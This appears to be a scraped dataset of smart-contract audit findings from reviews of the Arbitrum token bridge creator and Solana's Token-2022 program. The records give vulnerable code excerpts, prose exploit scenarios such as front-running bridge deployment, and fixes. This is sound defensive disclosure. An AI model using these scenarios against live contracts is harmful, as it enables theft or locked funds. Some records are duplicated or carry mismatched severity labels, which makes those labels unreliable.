creating the L1AtomicTokenBridgeCreator, and then insert a transaction before the second ticket is redeemed. If the user includes a call to L2AtomicTokenBridgeFactory.deployL2Contracts from any account other than the expected L1TokenBridgeRetryableSender, then the L2 contracts will be deployed at non-canonical addresses and will not match the addresses stored in the contract. The L2 contract addresses are dependent on the sender. This can be seen in the _getProxyAddress function, which computes the address of a TransparentUpgradeableProxy that is deployed by the L2AtomicTokenBridgeFactory using create2 given the salt calculated from the prex, the chain ID, and the sender. This sender is expected to be the L1TokenBridgeRetryableSender. function _getProxyAddress(bytes memory prefix, uint256 chainId) internal view returns (address) { return Create2.computeAddress( _getL2Salt(prefix, chainId), keccak256( abi.encodePacked( type(TransparentUpgradeableProxy).creationCode, abi.encode( canonicalL2FactoryAddress, _predictL2ProxyAdminAddress(chainId), bytes(\"\") ) ) ), canonicalL2FactoryAddress ); } //... function _getL2Salt(bytes memory prefix, uint256 chainId) internal view returns (bytes32) { return keccak256( abi.encodePacked( prefix, chainId, AddressAliasHelper.applyL1ToL2Alias(address(retryableSender)) ) ); } Figure 2.1: The L2 proxy address is computed. (L1AtomicTokenBridgeCreator.sol) The deployL2Contracts function can therefore be kept permissionlesssince only the deployments coming from the L1TokenBridgeRetryableSender are considered the canonical ones for the rollup. However, some of the contracts are deployed independently of the caller, at xed addresses using an unsalted create2 call, such as the UpgradeExecutor logic contract. // Create UpgradeExecutor logic and upgrade to it. address upExecutorLogic = Create2.deploy( 0, OrbitSalts.UNSALTED, CreationCodeHelper.getCreationCodeFor(runtimeCode) ); Figure 2.2: The upgrade executor logic is deployed at a xed address on L2. (L2AtomicTokenBridgeFactory.sol) As the address is xed, the contract cannot be redeployed to the same address once it has already been created. This essentially blocks any further calls to deployL2Contracts. In particular, this means that it is possible to block the second retryable ticket (coming from the L1TokenBridgeRetryableSender) that deploys the contracts at the precomputed addresses. The result is a mismatch in the stored deployment addresses, requiring a manual recovery. Exploit Scenario Bob, a malicious user, waits for the rollup owner to call createTokenBridge, starting the token bridge deployment process. On the rollup chain, Bob then manually redeems the rst ticket, which creates the L2 token bridge factory, and then calls deployL2Contracts from his own address. The rollup owner is not aware that their call fails. After many failed bridging attempts, the issue is discovered. The bridged funds are stuck, and the rollup owner is unable to recreate the L2 token bridge contracts via createTokenBridge. Recommendations Short term, ensure that the L2 bridge contract creation does not end up being blocked. Either deploy the currently unsalted contracts using create1 or make the create2 salt dependent on the sender by using _getL2Salt(OrbitSalts.UNSALTED). Long term, critically examine whether assumptionssuch as sending multiple retryable tickets being atomicare always valid and whether these can be exploited.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "3. Incorrect L2 Multicall address predicted ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf", "body": "The calculation of the deployment address for the L2 Multicall is incorrect. The code for createTokenBridge predicts that the address of Multicall will be deployed on the L2 using the .codehash value of the Multicall template. function _predictL2Multicall(uint256 chainId) internal view returns (address) { return Create2.computeAddress( _getL2Salt(OrbitSalts.L2_MULTICALL, chainId), l2MulticallTemplate.codehash, canonicalL2FactoryAddress ); } Figure 3.1: The L2 Multicall address is predicted (L1AtomicTokenBridgeCreator.sol) A contracts code hash is the keccak256 hash of the contracts runtime code. The create2 opcode, however, computes the address using the contract's creation code. The Multicall contract is created using a retryable ticket containing the runtime code and wraps it with a generic creation code. // deploy multicall Create2.deploy( 0, _getL2Salt(OrbitSalts.L2_MULTICALL), CreationCodeHelper.getCreationCodeFor(l2Code.multicall) ); Figure 3.2: The Multicall contract is deployed on L2 using create2 (L2AtomicTokenBridgeFactory.sol) This disparity causes the createTokenBridge contract to predict an incorrect address for the L2 Multicall contract. It is worth noting that this issue was not discovered during testing because the tests do not check the initialization of the L2Multicall contract properly; etherjs getCode returns 0x when the account has no code instead of returning empty bytes (). Therefore, the expect statement in gure 3.3 passes for a non-deployed contract (i.e., because 0x.length > 0). async function checkL2MulticallInitialization(l2Multicall: ArbMulticall2) { // check l2Multicall is deployed const l2MulticallCode = await l2Provider.getCode(l2Multicall.address) expect(l2MulticallCode.length).to.be.gt(0) } Figure 3.3: The Multicall contract initialization unit test (tokenBridgeDeploymentTest.ts) Exploit Scenario A user makes RPC Multicalls on the rollup using the address stored in the L1 contract. However, the RPC calls fail because the Multicall address is invalid. Recommendations Short term, x the precomputed address calculation or consider using the contract creation code directly. function _predictL2Multicall(uint256 chainId) internal view returns (address) { return Create2.computeAddress( _getL2Salt(OrbitSalts.L2_MULTICALL, chainId), keccak256(CreationCodeHelper.getCreationCodeFor(l2MulticallTemplate.code)), canonicalL2FactoryAddress ); } Figure 3.3: The L2 Multicall address prediction is xed Long term, include end-to-end tests checking that the computed address actually matches the deployed address. Additionally, consider checking that the actual deployed code matches the expected template instead of checking whether or not the address has code. Finally, whenever an external API (e.g., etherjs) is used, it is of utmost importance to check the documentation to ensure that the values returned by the functions are the expected ones.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. Rollup owner is assumed to be an EOA ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf", "body": "The rollup owner is currently assumed to be an EOA (externally owned account); however, this is neither explicitly checked nor veried. Some proxy logic contracts must rst be initialized to protect against an unexpected initialization that can cause the execution of critical operations (e.g., selfdestruct). // sweep the balance to send the retryable and refund the difference // it is known that any eth previously in this contract can be extracted // tho it is not expected that this contract will have any eth retryableSender.sendRetryable{value: isUsingFeeToken ? 0 : address(this).balance}( RetryableParams( inbox, canonicalL2FactoryAddress, msg.sender, msg.sender, maxGasForContracts, gasPriceBid ), L2TemplateAddresses( l2RouterTemplate, l2StandardGatewayTemplate, l2CustomGatewayTemplate, isUsingFeeToken ? address(0) : l2WethGatewayTemplate, isUsingFeeToken ? address(0) : l2WethTemplate, address(l1Templates.upgradeExecutor), l2MulticallTemplate ), l1Deployment, l2Deployment.standardGateway, rollupOwner, msg.sender, AddressAliasHelper.applyL1ToL2Alias(upgradeExecutor), isUsingFeeToken ); Figure 4.1: The rollup owner address is passed as a parameter to the retryable ticket (L1AtomicTokenBridgeCreator.sol) The address is then included as an executor role in the upgrade executor contract. // init upgrade executor address[] memory executors = new address[](2); executors[0] = rollupOwner; executors[1] = aliasedL1UpgradeExecutor; IUpgradeExecutor(canonicalUpgradeExecutor).initialize(canonicalUpgradeExecutor, executors); Figure 4.2: The rollup owner is given the executor role in the upgrade executor (L2AtomicTokenBridgeFactory.sol) This implicitly assumes that the rollup owner will always be an EOA, as otherwise, if it was a contract, the address would be aliased to an L2 address. If this were the case, it would not be able to make the calls to the upgrade executor, because it has stored the unaliased L1 address. This assumption is not clearly stated and not veried on-chain. In order to prevent centralization issues, the rollups owner should be expected to be a timelock-controlled multisig contract. Exploit Scenario A multisig rollup owner creates a token bridge. The rollup owner is added as an executor to the upgrade executor. However, the owner is now unable to make any upgrade calls because the unaliased address has been stored. Recommendations Short term, document the assumption that the rollup owner is expected to be an EOA and consider explicitly checking whether or not the rollup owner is a contract. Additionally, both the aliased and unaliased address could be given executor control in the upgrade executor. Long term, revisit assumptions that may not be explicitly stated; include explicit checks for these, or ensure that no unexpected scenario is created. 5. Depositing before the token bridge is fully deployed can result in loss of funds Severity: Medium Diculty: High Type: Data Validation Finding ID: TOB-ARB-TBC-005 Target: contracts/tokenbridge/ethereum/L1AtomicTokenBridgeCreator.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Dangerous aliasing assumption ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf", "body": "Applying the L1-to-L2 alias for user-provided addresses depends on L1 contracts, which can cause aliasing addresses to point to invalid addresses. Both the excessFeeRefundAddress and the callValueRefundAddresstwo addresses that the user provides when createRetryableTicket is calledare aliased depending on whether the L1 address contains code. // if a refund address is a contract, we apply the alias to it // so that it can access its funds on the L2 // since the beneficiary and other refund addresses don't get rewritten by arb-os if (AddressUpgradeable.isContract(excessFeeRefundAddress)) { excessFeeRefundAddress = AddressAliasHelper.applyL1ToL2Alias(excessFeeRefundAddress); } if (AddressUpgradeable.isContract(callValueRefundAddress)) { // this is the beneficiary. be careful since this is the address that can cancel the retryable in the L2 callValueRefundAddress = AddressAliasHelper.applyL1ToL2Alias(callValueRefundAddress); } Figure 6.1: Aliasing of user provided addresses (AbsInbox.sol) Because it is not possible to reliably determine whether the user wants to use an aliased or unaliased version of a given L2 address, this step can lead to mistakes by erroneously applying an alias where it was not expected. This could cause the refund to be sent to a nonexistent address on L2, where it could be recovered only from its L1 counterpart, which could be an immutable contract. Exploit Scenario The following events occur:  Alice (EOA) deploys a random token contract using nonce 0 at address 0xabc on L1.  Alice also deploys a multisig contract using nonce 0 at address 0xabc on L2.  Alice creates a retryable ticket and species the callValueRefundAddress as the L2 multisig (at 0xabc).  The alias check converts 0xabc to a nonexistent address on L2 due to the unrelated L1 token contract.  Only L1 token contract is able to recover funds, but it does not contain logic to do so, as it is an immutable token contract. Recommendations Short term, clearly document the behavior and make it clear to a user that an alias will apply in certain cases. Consider not making any assumptions on behalf of the user and include o-chain checks and validations in a web app. Long term, consider adding further on-chain checks to ensure that the L1 contract is able to send retryable tickets and recover the funds when applying an alias.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "7. Unclear decimal units of provided amounts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf", "body": "When creating retryable tickets, the caller must provide multiple token values in various units, which could be prone to errors. The createRetryableTicket function requires the user to provide various parameters in dierent units. function _createRetryableTicket( address to, uint256 l2CallValue, uint256 maxSubmissionCost, address excessFeeRefundAddress, address callValueRefundAddress, uint256 gasLimit, uint256 maxFeePerGas, uint256 amount, bytes calldata data ) internal returns (uint256) { // ensure the user's deposit alone will make submission succeed uint256 amountToBeMintedOnL2 = _fromNativeTo18Decimals(amount); if (amountToBeMintedOnL2 < (maxSubmissionCost + l2CallValue + gasLimit * maxFeePerGas)) { revert InsufficientValue( maxSubmissionCost + l2CallValue + gasLimit * maxFeePerGas, amountToBeMintedOnL2 ); } // ... ) Figure 7.1: The _createRetryableTicket function (AbsInbox.sol) The parameter amount is given in the native tokens decimal units. The parameters l2CallValue, maxSubmissionCost, and maxFeePerGas are denominated using 18 decimal units. Neither the parameter names nor the NatSpec comments suggest that the values are given in diering units, which can cause mistakes in integration. Exploit Scenario An optimistic cross-chain bridge and AMM protocol is built on top of Arbitrum. When integrating with an Orbit chain with non-standard decimals, the incorrect decimal units are hard coded into the token handler contract, causing values that are too high to be sent to the Orbit chain when bridging the native token. Recommendations Short term, consider making a clear distinction between the units depending on the chain. For example, on L1, all values will always be denominated in the native tokens decimal units, and on L2, all values will always be denominated using 18 decimal points. Long term, be aware of confusions that can arise when assumptions in the API are not clearly documented. Aim to remove the risk of mistakes by focusing on clear usability when interacting with the bridge contracts.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "4. Rollup owner is assumed to be an EOA ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf", "body": "The rollup owner is currently assumed to be an EOA (externally owned account); however, this is neither explicitly checked nor veried. Some proxy logic contracts must rst be initialized to protect against an unexpected initialization that can cause the execution of critical operations (e.g., selfdestruct). // sweep the balance to send the retryable and refund the difference // it is known that any eth previously in this contract can be extracted // tho it is not expected that this contract will have any eth retryableSender.sendRetryable{value: isUsingFeeToken ? 0 : address(this).balance}( RetryableParams( inbox, canonicalL2FactoryAddress, msg.sender, msg.sender, maxGasForContracts, gasPriceBid ), L2TemplateAddresses( l2RouterTemplate, l2StandardGatewayTemplate, l2CustomGatewayTemplate, isUsingFeeToken ? address(0) : l2WethGatewayTemplate, isUsingFeeToken ? address(0) : l2WethTemplate, address(l1Templates.upgradeExecutor), l2MulticallTemplate ), l1Deployment, l2Deployment.standardGateway, rollupOwner, msg.sender, AddressAliasHelper.applyL1ToL2Alias(upgradeExecutor), isUsingFeeToken ); Figure 4.1: The rollup owner address is passed as a parameter to the retryable ticket (L1AtomicTokenBridgeCreator.sol) The address is then included as an executor role in the upgrade executor contract. // init upgrade executor address[] memory executors = new address[](2); executors[0] = rollupOwner; executors[1] = aliasedL1UpgradeExecutor; IUpgradeExecutor(canonicalUpgradeExecutor).initialize(canonicalUpgradeExecutor, executors); Figure 4.2: The rollup owner is given the executor role in the upgrade executor (L2AtomicTokenBridgeFactory.sol) This implicitly assumes that the rollup owner will always be an EOA, as otherwise, if it was a contract, the address would be aliased to an L2 address. If this were the case, it would not be able to make the calls to the upgrade executor, because it has stored the unaliased L1 address. This assumption is not clearly stated and not veried on-chain. In order to prevent centralization issues, the rollups owner should be expected to be a timelock-controlled multisig contract. Exploit Scenario A multisig rollup owner creates a token bridge. The rollup owner is added as an executor to the upgrade executor. However, the owner is now unable to make any upgrade calls because the unaliased address has been stored. Recommendations Short term, document the assumption that the rollup owner is expected to be an EOA and consider explicitly checking whether or not the rollup owner is a contract. Additionally, both the aliased and unaliased address could be given executor control in the upgrade executor. Long term, revisit assumptions that may not be explicitly stated; include explicit checks for these, or ensure that no unexpected scenario is created.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Depositing before the token bridge is fully deployed can result in loss of funds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf", "body": "If a user triggers a deposit in the L1 side of the token bridge before it is fully deployed, their deposit will not be executed as expected, and their funds will not be minted on the L2. Token bridge creation relies on the usage of two retryable tickets that will correctly set up the L2 side of the bridge. /** * @notice Deploy and initialize token bridge, both L1 and L2 sides, as part of a single TX. * @dev This is a single entrypoint of L1 token bridge creator. Function deploys L1 side of token bridge and then uses * 2 retryable tickets to deploy L2 side. 1st retryable deploys L2 factory. And then 'retryable sender' contract * is called to issue 2nd retryable which deploys and inits the rest of the contracts. L2 chain is determined by `inbox` parameter. * * * Token bridge can be deployed only once for certain inbox. Any further calls to `createTokenBridge` will revert * because L1 salts are already used at that point and L1 contracts are already deployed at canonical addresses for that inbox. * */ Figure 5.1: Documentation on the deployment of the token bridge (L1AtomicTokenBridgeCreator.sol) However, if the both tickets are not immediately redeemed, a deposit from the L1 will produce an incomplete deposit in L2. Exploit Scenario Alice starts the process of the token bridge deployment. A spike in the L2 activity causes the retryable tickets not to execute immediately. Bob is eager to use the L2, so he quickly deposits into the token bridge, even though the bridge is not fully deployed yet. If Bobs retryable ticket with the deposit is executed before the L2 of the bridge is ready, the retryable ticket will call an empty account and it will not revert, leaving Bob without the L2 counterpart of his tokens. Recommendations Short term, consider adding a front-end check to verify that the L2 counterpart deployment has succeeded. Provide a clear error to the client that the token bridge is not yet fully deployed yet and that any deposit will result in loss of funds. Long term, review the assumptions of the token bridge during its usage to ensure that the new deployment will not break any of them.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "8. Token values in DeployHelper are not adjusted to token decimals ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf", "body": "The DeployHelper contract deploys helper contracts to the L2 chain through retryable tickets containing hard-coded values that could be chain- and token decimal-dependent. Certain helper contracts can be deployed in the DeployHelper contract as part of the rollup creation process. These helper contracts are sent via signed transactions. // Nick's CREATE2 Deterministic Deployment Proxy // https://github.com/Arachnid/deterministic-deployment-proxy address public constant NICK_CREATE2_DEPLOYER = 0x3fAB184622Dc19b6109349B94811493BF2a45362; uint256 public constant NICK_CREATE2_VALUE = 0.01 ether; bytes public constant NICK_CREATE2_PAYLOAD = hex\"04f8a58085174876e80083...\"; Figure 8.1: Aliasing of user-provided addresses (AbsInbox.sol) Before sending these L2 transactions, a retryable ticket is rst created in order to fund the deployer address. uint256 feeAmount = _value + submissionCost + GASLIMIT * maxFeePerGas; // fund the target L2 address if (_isUsingFeeToken) { IERC20Inbox(inbox).createRetryableTicket({ to: _l2Address, l2CallValue: _value, maxSubmissionCost: submissionCost, excessFeeRefundAddress: msg.sender, callValueRefundAddress: msg.sender, gasLimit: GASLIMIT, maxFeePerGas: maxFeePerGas, tokenTotalFeeAmount: feeAmount, data: \"\" }); } else { Figure 8.2: The token total fee amount is being calculated (DeployHelper.sol) The fee amount is computed in order to cover the L2 value, the submission cost (0 in the case of using a fee token), and the retryable TX gas cost. When creating a retryable ticket, the tokenTotalFeeAmount parameter is expected to be given in the native token decimal units, as it is converted to 18 decimals. This means that if the custom fee tokens decimals dier, then the actual token value that is sent will be miscalculated. When the bridge receives a token value that is too little, it will transfer the missing funds from msg.sender (DeployHelper), causing the transaction to revert. Exploit Scenario Alice creates a new rollup with her custom fee token that uses six decimal points. When deploying the helper contracts, due to the miscalculation, the Inbox requests a large amount of tokens (0.01e18 * (1e18 - 1e6) = 10M tokens) from the DeployHelper. As the DeployHelper has not given any token spending approval to the Inbox, this would result in a transaction failure. If the tokens are manually sent to the Inbox, a large part would be stuck in an unrecoverable address. Conversely, if the fee token uses decimal points greater than 18, then it is possible that too little value would be sent for the successful contract creation. Recommendations Short term, convert the value given in 18 decimal units to the native token decimal units (rounded up if needed). Long term, implement further testing that includes bounds on expected deployment costs. Additionally, avoid patterns that can cause confusion in function APIs. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "1. Ok returned for malformed extension data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "In the get_extension_types function, if the account type-length-value (TLV) data is malformed and the TLV record data is truncated (i.e., the account data length is less than the start oset summed with the length of the TLV data), the function returns Ok rather than an error. fn get_extension_types (tlv_data: & [ u8 ]) -> Result < Vec <ExtensionType>, ProgramError> { let mut extension_types = vec! []; let mut start_index = 0 ; while start_index < tlv_data.len() { let tlv_indices = get_tlv_indices(start_index); if tlv_data.len() < tlv_indices.value_start { return Ok (extension_types); } Figure 1.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L127-L134 Recommendations Short term, modify the get_extension_types function so that it returns an error if the TLV data is corrupt. This will ensure that the Token Program will not continue processing if the provided accounts extension data is corrupt.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "2. Missing account ownership checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "Every account that the Token Program operates on should be owned by the Token Program, but several instructions lack account ownership checks. The functions lacking checks include process_reallocate , process_withdraw_withheld_tokens_from_mint , and process_withdraw_withheld_tokens_from_accounts . Many of these functions have an implicit check for this condition in that they modify the account data, which is possible only if the account is owned by the Token Program; however, future changes to the associated code could remove this protection. For example, in the process_withdraw_withheld_tokens_from_accounts instruction, neither the mint_account_info nor destination_account_info parameter is checked to ensure the account is owned by the Token Program. While the mint accounts data is mutably borrowed, the account data is never written. As a result, an attacker could pass a forged account in place of the mint account. Conversely, the destination_account_info accounts data is updated by the instruction, so it must be owned by the Token Program. However, if an attacker can nd a way to spoof an account public key that matches the mint property in the destination account, he could bypass the implicit check. Recommendations Short term, as a defense-in-depth measure, add explicit checks of account ownership for all accounts passed to instructions. This will both improve the clarity of the codebase and remove the dependence on implicit checks, which may no longer hold true when updates occur.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "3. Use of a vulnerable dependency ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "Running the cargo audit command uncovered the use of one crate with a known vulnerability ( time ).  cargo audit Fetching advisory database from `https://github.com/RustSec/advisory-db.git` Loaded 458 security advisories (from /Users/andershelsing/.cargo/advisory-db) Updating crates.io index Scanning Cargo.lock for vulnerabilities (651 crate dependencies) Crate: time Version: 0.1.44 Title: Potential segfault in the time crate Date: 2020-11-18 ID: RUSTSEC-2020-0071 URL: https://rustsec.org/advisories/RUSTSEC-2020-0071 Solution: Upgrade to >=0.2.23 Figure 3.1: The result of running the cargo audit command Recommendations Short term, triage the use of the vulnerability in the time crate and upgrade the crate to a version in which the vulnerability is patched.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "4. Large extension sizes can cause panics ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The call to try_from in the init_extension function returns an error if the length of the given extension is larger than u16::Max , which causes the unwrap operation to panic. let length = pod_get_packed_len::<V>(); *length_ref = Length::try_from(length).unwrap(); Figure 4.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L493-L494 Recommendations Short term, add assertions to the program to catch extensions whose sizes are too large, and add relevant code to handle errors that could arise in the try_from function. This will ensure that the Token Program does not panic if any extension grows larger than u16::Max .", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "5. Unexpected function behavior ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The decode_instruction_data function receives a byte slice representing the instruction data. Specically, the function expects the rst byte of the slice to contain the instruction type for an extension instruction; however, the function name does not clearly convey this intended behavior, and the behavior is not explained in code comments. /// Utility function for decoding instruction data pub fn decode_instruction_data <T: Pod >(input: & [ u8 ]) -> Result <&T, ProgramError> { if input.len() != pod_get_packed_len::<T>().saturating_add( 1 ) { Err (ProgramError::InvalidInstructionData) } else { pod_from_bytes( &input[ 1 ..] ) } } Figure 5.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/instruction.rs#L1761-L1768 Recommendations Short term, change the decode_instruction_data function so that it operates only on instruction data, and remove the instruction type from the data passed prior to the call. This will ensure that the functions name is in line with the functions operation.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "6. Out of bounds access in the get_extension instruction ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The get_extension function instantiates a type from a TLV record. However, the get_extension_indices function does not check that the accounts data length is large enough for the value_end index. fn get_extension <S: BaseState , V: Extension >(tlv_data: &[u8]) -> Result <&V, ProgramError> { if V::TYPE.get_account_type() != S::ACCOUNT_TYPE { return Err (ProgramError::InvalidAccountData); } let TlvIndices { type_start: _ , length_start, value_start, } = get_extension_indices::<V>(tlv_data, false )?; // get_extension_indices has checked that tlv_data is long enough to include these indices let length = pod_from_bytes::<Length>(&tlv_data[length_start..value_start])?; let value_end = value_start.saturating_add(usize::from(*length)); pod_from_bytes::<V>(&tlv_data[ value_start..value_end ]) } Figure 6.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L235-L248 Recommendations Short term, add a check to ensure that the TLV data for the account is large enough for the value_end index, and add relevant code to handle the error if it is not. This will ensure that the Token Program will not panic on accounts with truncated data.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "7. Iteration over empty data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The get_extension_indices function returns either the indices for a given extension type or the rst uninitialized slot. Because a TLV data record can never be deleted, the rst zero-value entry of the slice should indicate that the iteration has reached the end of the used data space. However, if the init parameter is false, the start_index index is advanced by two, and the iteration continues, presumably iterating over empty data until it reaches the end of the TLV data for the account. while start_index < tlv_data.len() { let tlv_indices = get_tlv_indices(start_index); if tlv_data.len() < tlv_indices.value_start { return Err (ProgramError::InvalidAccountData); } ... // got to an empty spot, can init here, or move forward if not initing if extension_type == ExtensionType::Uninitialized { if init { return Ok (tlv_indices); } else { start_index = tlv_indices.length_start; } } ... Figure 7.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L96-L122 Recommendations Short term, modify the associated code so that it terminates the iteration when it reaches uninitialized data, which should indicate the end of the used TLV record data.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. Missing check in UpdateMint instruction could result in inoperable mints ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "If a mints auto_approve_new_accounts property is false , the ApproveAccount instruction needs the mints authority to sign transactions approving Accounts for the mint. However, issuing an update_mint instruction with the new authority set to Pubkey::default and the auto_approve_new_accounts property set to false would prevent Accounts from being approved. /// Processes an [UpdateMint] instruction. fn process_update_mint ( accounts: & [AccountInfo], new_confidential_transfer_mint: & ConfidentialTransferMint , ) -> ProgramResult { let account_info_iter = & mut accounts.iter(); let mint_info = next_account_info(account_info_iter)?; let authority_info = next_account_info(account_info_iter)?; let new_authority_info = next_account_info(account_info_iter)?; check_program_account(mint_info.owner)?; let mint_data = & mut mint_info.data.borrow_mut(); let mut mint = StateWithExtensionsMut::<Mint>::unpack(mint_data)?; let confidential_transfer_mint = mint.get_extension_mut::<ConfidentialTransferMint>()?; if authority_info.is_signer && confidential_transfer_mint.authority == *authority_info.key && (new_authority_info.is_signer || *new_authority_info.key == Pubkey::default() ) && new_confidential_transfer_mint.authority == *new_authority_info.key { *confidential_transfer_mint = *new_confidential_transfer_mint; Ok (()) } else { Err (ProgramError::MissingRequiredSignature) } } Figure 8.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L64-L89 /// Processes an [ApproveAccount] instruction. fn process_approve_account (accounts: & [AccountInfo]) -> ProgramResult { let account_info_iter = & mut accounts.iter(); let token_account_info = next_account_info(account_info_iter)?; let mint_info = next_account_info(account_info_iter)?; let authority_info = next_account_info(account_info_iter)?; check_program_account(token_account_info.owner)?; let token_account_data = & mut token_account_info.data.borrow_mut(); let mut token_account = StateWithExtensionsMut::<Account>::unpack(token_account_data)?; check_program_account(mint_info.owner)?; let mint_data = &mint_info.data.borrow_mut(); let mint = StateWithExtensions::<Mint>::unpack(mint_data)?; let confidential_transfer_mint = mint.get_extension::<ConfidentialTransferMint>()?; if authority_info.is_signer && *authority_info.key == confidential_transfer_mint.authority { let mut confidential_transfer_state = token_account.get_extension_mut::<ConfidentialTransferAccount>()?; confidential_transfer_state.approved = true .into(); Ok (()) } else { Err (ProgramError::MissingRequiredSignature) } } Figure 8.2: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L180-L204 Recommendations Short term, add a check to ensure that the auto_approve_new_accounts property is not false when the new authority is Pubkey::default . This will ensure that contract users cannot accidentally disable the authorization of accounts for mints.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Incorrect test data description ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The comments on the MINT_WITH_EXTENSION variable are incorrect. See gure 9.1 for the incorrect comments, highlighted in red, and the corrected comments, highlighted in yellow. const MINT_WITH_EXTENSION: & [ u8 ] = &[ // base mint 1 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , ]; 1 , 1 , 1 , 1 , 1 , 42 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 7 , 1 , 1 , 0 , 0 , 0 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , // padding 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , // account type 1 , // extension type <== really account type 3 , 0 , // length <== really extension type 32 , 0 , // data <== really extension length 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , <== really extension data Figure 9.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/mod.rs#L828 -L841 Recommendations Short term, update the comments to align with the data. This will ensure that developers working on the tests will not be confused by the data structure.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "10. The Transfer and TransferWithFee instructions are identical ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The implementations of the Transfer and TransferWithFee instructions are identical. Whether fees are used is determined by whether the mint has a TransferFeeConfig extension, regardless of the instruction used. ConfidentialTransferInstruction::Transfer => { msg!( \"ConfidentialTransferInstruction::Transfer\" ); #[cfg(feature = \"zk-ops\" )] { let data = decode_instruction_data::<TransferInstructionData>(input)?; process_transfer( program_id, accounts, data.new_source_decryptable_available_balance, data.proof_instruction_offset as 